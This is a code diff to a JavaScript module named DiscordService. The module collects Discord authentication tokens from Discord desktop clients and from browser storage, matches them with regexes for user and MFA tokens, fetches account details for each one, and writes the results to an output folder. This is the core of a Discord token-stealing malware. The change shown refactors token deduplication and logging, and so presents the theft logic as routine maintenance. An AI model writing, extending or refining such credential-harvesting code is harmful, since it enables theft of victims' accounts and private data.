@@ -13,6 +13,7 @@ const { logger } = require('../../core/logger');
 const { ErrorHandler, NetworkError, ModuleError } = require('../../core/errors');
 const { fileManager } = require('../../core/fileManager');
 const { stats } = require('../../core/statistics');
+const { TokenUtils } = require('../../core/tokenUtils');
 const config = require('../../config/config');
 
 class DiscordService {
@@ -97,14 +98,14 @@ class DiscordService {
         logger.info('Starting Discord account collection');
 
         const accounts = [];
-        const allTokens = new Set();
+        const allTokens = [];
 
         try {
             // Collect tokens from Discord applications
             for (const [clientKey, clientConfig] of Object.entries(this.discordPaths)) {
                 try {
                     const clientTokens = await this.collectClientTokens(clientKey, clientConfig);
-                    clientTokens.forEach(token => allTokens.add(token));
+                    allTokens.push(...clientTokens);
                 } catch (error) {
                     ErrorHandler.handle(
                         new ModuleError(`Failed to collect tokens from ${clientConfig.name}`, 'discord'),
@@ -117,7 +118,7 @@ class DiscordService {
             // Collect tokens from browsers
             try {
                 const browserTokens = await this.collectBrowserTokens();
-                browserTokens.forEach(token => allTokens.add(token));
+                allTokens.push(...browserTokens);
             } catch (error) {
                 ErrorHandler.handle(
                     new ModuleError('Failed to collect tokens from browsers', 'discord'),
@@ -126,8 +127,18 @@ class DiscordService {
                 );
             }
 
+            // Enhanced deduplication using TokenUtils
+            const deduplicatedTokens = TokenUtils.deduplicate(allTokens);
+            const uniqueTokensSet = new Set(deduplicatedTokens);
+
+            logger.info('Token collection and deduplication completed', {
+                totalTokensCollected: allTokens.length,
+                uniqueTokensAfterDeduplication: uniqueTokensSet.size,
+                duplicatesRemoved: allTokens.length - uniqueTokensSet.size
+            });
+
             // Get account information for all unique tokens
-            for (const token of allTokens) {
+            for (const token of uniqueTokensSet) {
                 try {
                     const accountData = await this.getAccountInfo(token);
                     if (accountData) {
@@ -152,7 +163,7 @@ class DiscordService {
             }
 
             // Only create Discord folder if tokens were detected
-            this.ensureDiscordFolderExists(accounts.length, allTokens.size);
+            this.ensureDiscordFolderExists(accounts.length, uniqueTokensSet.size);
 
             // Update statistics
             for (const account of accounts) {
@@ -161,7 +172,7 @@ class DiscordService {
 
             logger.info(`Discord account collection completed`, {
                 totalAccounts: accounts.length,
-                totalTokens: allTokens.size,
+                totalUniqueTokens: uniqueTokensSet.size,
                 clients: Object.keys(this.discordPaths).length
             });
 
@@ -174,12 +185,12 @@ class DiscordService {
     /**
      * Ensure Discord folder exists only when tokens are detected
      * @param {number} accountCount - Number of accounts found
-     * @param {number} tokenCount - Number of tokens detected
+     * @param {number} uniqueTokenCount - Number of unique tokens detected
      */
-    ensureDiscordFolderExists(accountCount, tokenCount) {
+    ensureDiscordFolderExists(accountCount, uniqueTokenCount) {
         try {
             // Only create Discord folder if tokens were detected
-            if (tokenCount === 0) {
+            if (uniqueTokenCount === 0) {
                 logger.info('No Discord tokens detected - skipping Discord folder creation');
                 return;
             }
@@ -190,7 +201,7 @@ class DiscordService {
 Generated: ${new Date().toISOString()}
 
 Status: Discord tokens detected but no accounts processed
-Tokens Found: ${tokenCount}
+Unique Tokens Found: ${uniqueTokenCount}
 Processed Accounts: ${accountCount}
 
 Reason: This could happen for several reasons:
@@ -211,7 +222,7 @@ This file indicates that the Discord module found tokens but couldn't process th
                 fileManager.saveText(infoMessage, 'Discord', 'Tokens_Found_But_Not_Processed.txt');
                 logger.info('Created Discord folder with informational file - tokens found but not processed');
             } else {
-                logger.debug(`Discord folder created with ${accountCount} account(s) from ${tokenCount} token(s)`);
+                logger.debug(`Discord folder created with ${accountCount} account(s) from ${uniqueTokenCount} unique token(s)`);
             }
         } catch (error) {
             logger.warn('Failed to ensure Discord folder exists', error.message);
@@ -289,8 +300,8 @@ This file indicates that the Discord module found tokens but couldn't process th
             logger.debug(`Failed to extract encrypted tokens from ${leveldbPath}`, error.message);
         }
 
-        // Remove duplicates
-        return [...new Set(encryptedTokens)].filter(token => token != null);
+        // Enhanced deduplication using TokenUtils
+        return TokenUtils.deduplicate(encryptedTokens);
     }
 
     /**
@@ -386,9 +397,9 @@ This file indicates that the Discord module found tokens but couldn't process th
 
         // Token patterns for direct token search in browsers
         const cleanRegex = [
-            /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/gm,          // Standard user tokens
+            /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/gm,       // Variable length tokens
             /mfa\.[\w-]{84}/gm,                          // MFA tokens  
-            /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/gm       // Variable length tokens
+            /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/gm           // Standard user tokens
         ];
 
         for (const browserPath of browserPaths) {
@@ -424,8 +435,8 @@ This file indicates that the Discord module found tokens but couldn't process th
             }
         }
 
-        // Remove duplicates and null values
-        return [...new Set(tokens)].filter(token => token != null);
+        // Enhanced deduplication using TokenUtils
+        return TokenUtils.deduplicate(tokens);
     }
 
     /**
